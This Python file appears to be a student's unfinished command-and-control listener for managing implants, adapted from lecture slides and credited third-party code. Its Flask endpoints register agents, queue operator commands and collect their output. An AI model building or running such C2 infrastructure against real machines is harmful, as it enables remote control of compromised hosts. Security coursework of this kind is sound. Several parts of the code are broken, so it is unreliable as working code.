##from lecture slides, refrenced 0xRick c2 code

import sqlite3
from flask import Flask, request, jsonify
import threading
import os, sys, random, string
from app.models.agent import agents
import multiprocessing as mp
from multiprocessing import Process
import requests 
from app.app import createFlaskApp



class FlaskListener():
    """控制端表"""
    
    c2_server = "http://127.0.0.1:8080"
    lock = mp.Lock()
    implant_lock = mp.Lock()
    TASKS = []
    AGENTS = []
    path = "data/listeners/{__name__}/"

    createflask = createFlaskApp()
    app = createflask.create_app()
    encryptionkey = None
    
    def __init__(self):
        self.ip = "127.0.0.1"
        self.port = "8080"
        self.flaskname = "".join(random.choice(string.ascii_letters) for i in range(6))
    

    @app.route("/tasks", methods=["GET"])
    def download_tasks(self):
        global TASKS
        self.lock.acquire()
        try:
            batch = "\n".join(TASKS[:5])
            TASKS = TASKS[5:]
        finally:
            self.lock.release()
        return batch 

    @app.route("/response", methods=["POST"])
    def print_response():
        print(request.data.decode())
        return ""

    @app.route("/queue")
    def print_queue():
        return jsonify(TASKS)

    @app.route("/secret", methods=["POST"])
    def add_request(self):
        r = request.json
        self.lock.acquire()
        try:
            for cmd in r:
                TASKS.append(cmd)
        finally:
            self.lock.release()
        print("Queued up ", r)
        return "True"

    @app.route("/register", methods=['POST', 'GET'])
    def addAgent(self, client_id):
        self.guid, self.hostname, self.username = request.get_json()
        agent = agents(self.guid, self.hostname, self.username, self.encryptionkey)
        #addtodatabase(agent)
        return self.encryptionkey

    def encryptionkey(self):
        #if self.encryptionkey == None:
        #    self.encryptionkey = getencryptionkey()
        self.encryptionkey = "blahblahblah"
        return self.encryptionkey
            
    
    ###from 0xRick
    
    def run(self):
        self.app.logger.disabled = True
        self.app.run(port=self.port, host=self.ipaddress)
        return
        
    def startlistener(self):
        self.server = Process(target = self.run)
    
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None
    
        self.thread = threading.Thread(target = self.server.start,
                                           args = ())
        self.thread.thread = True
        self.thread.start()
    
        self.isRunning = True
    
    def stoplistener(self):
        self.server.terminate()
        self.server = None
        self.thread = None
        self.isRunning = False
        
    def getapp(self):
        return self.app
        
        
        
        
        
        
        
        
        
        
        
        
    